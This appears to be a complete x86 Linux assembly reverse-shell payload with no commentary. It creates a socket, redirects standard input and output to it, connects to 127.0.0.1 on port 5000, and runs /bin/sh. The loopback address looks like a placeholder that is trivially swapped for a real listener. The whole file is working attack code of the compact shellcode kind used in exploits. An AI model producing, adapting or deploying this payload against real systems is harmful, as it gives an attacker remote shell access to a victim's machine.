        .intel_syntax noprefix
        .globl _start
_start:
        xor ebx, ebx
        mul ebx
        push ebx
        inc ebx
        push ebx
        push 2
        mov ecx, esp
        mov al, 102
        int 0x80
dup:
        xchg ebx, eax
        pop ecx
dup_loop:
        mov al, 63
        int 0x80
        dec ecx
        jns dup_loop
connect:
        push 0x100007f
        pushw 0x8813
        pushw 2
        mov ecx, esp
        mov al, 102
        push eax
        push ecx
        push ebx
        mov bl, 3
        mov ecx, esp
        int 0x80
exec_shell:
        push edx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push edx
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
